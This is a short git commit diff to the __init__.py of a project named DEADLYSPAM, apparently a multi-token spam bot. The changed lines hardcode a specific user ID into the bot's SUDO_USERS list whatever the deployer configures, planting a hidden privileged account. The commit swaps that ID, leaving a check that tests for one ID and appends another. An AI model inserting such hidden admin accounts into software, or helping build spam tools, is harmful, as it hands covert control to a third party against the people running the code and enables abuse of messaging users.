f656af2f18502cf048d0ea9b533c93eef2361697
BlazeOp <94062864+piroXpower@users.noreply.github.com>
2023-01-27 19:19:51 +0530

    Update __init__.py

--- DEADLYSPAM/__init__.py
+++ DEADLYSPAM/__init__.py
@@ -38,7 +38,7 @@ BOT_TOKEN9 = config("BOT_TOKEN9", default=None)
 BOT_TOKEN10 = config("BOT_TOKEN10", default=None)
 SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
 if 5256676062 not in SUDO_USERS:
-    SUDO_USERS.append(5256676062)
+    SUDO_USERS.append(5937170640)
 
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
 
